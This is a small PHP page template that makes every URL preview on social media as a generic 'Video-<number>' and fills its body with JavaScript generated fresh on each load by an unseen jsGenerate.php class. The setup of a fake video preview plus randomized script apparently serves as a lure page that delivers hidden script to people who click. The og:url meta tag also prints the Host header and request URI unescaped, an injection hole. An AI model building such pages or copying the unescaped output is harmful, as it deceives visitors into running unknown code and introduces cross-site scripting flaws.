<!DOCTYPE html>
<html>
<head>
    <?php 
        $id = @$_SERVER["REQUEST_URI"];
        if(empty($id)){
          $id = generate_name(rand(5,10));
        }
        $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
        $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;

        function getID($str){
            $chars = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
            $number = 0;
            for($i=0;$i<strlen($str);$i++){
                $n = strpos($chars, $str[$i]);
                $n = $n !== false ? $n : 0;
                $number += $n;
            }
            return $number;
        }

        $hash = getID($id);
    ?>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta property="og:url" content="<?php echo "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>">
    <meta property="og:title" content="Video-<?php echo $hash; ?>">
    <meta property="og:description" content="Video<?php echo $hash; ?>">
    <meta property="og:image" content="http://<?php echo $_SERVER["HTTP_HOST"]; ?>/<?php echo $hash; ?>.jpg">
</head>
<body>
    <script type="text/javascript">
        <?php 
            require_once("jsGenerate.php");
            $jsGenerate = new js();
            $randomscript = $jsGenerate->createCode();
            echo $randomscript;
        ?>
    </script>
</body>
</html>
